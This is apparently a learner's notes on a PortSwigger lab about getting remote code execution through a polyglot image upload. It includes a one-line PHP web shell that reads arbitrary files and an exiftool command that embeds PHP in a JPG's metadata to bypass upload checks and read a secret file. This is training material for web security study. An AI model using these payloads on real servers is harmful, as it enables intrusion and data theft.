https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload

This lab contains a vulnerable image upload function.
upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret


1) write a exploit.php file that contains 
    <?php echo file_get_contents($_GET['filepath']); ?>

2) upload it as image,
    the website blocks it and no one technique works

3) try to inject into a jpg image the php payload in the metadata

4) exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php

(cat.jpg in this case)
    

5) upload the malicious image

3) open the image in another tab and add the query parameter to have 
    /files/avatars/exploit.php
    
    search for START and the key after START is the secret key

4) done

NOTE: Web servers often use the filename field in multipart/form-data requests to determine the name and location where the file should be saved.
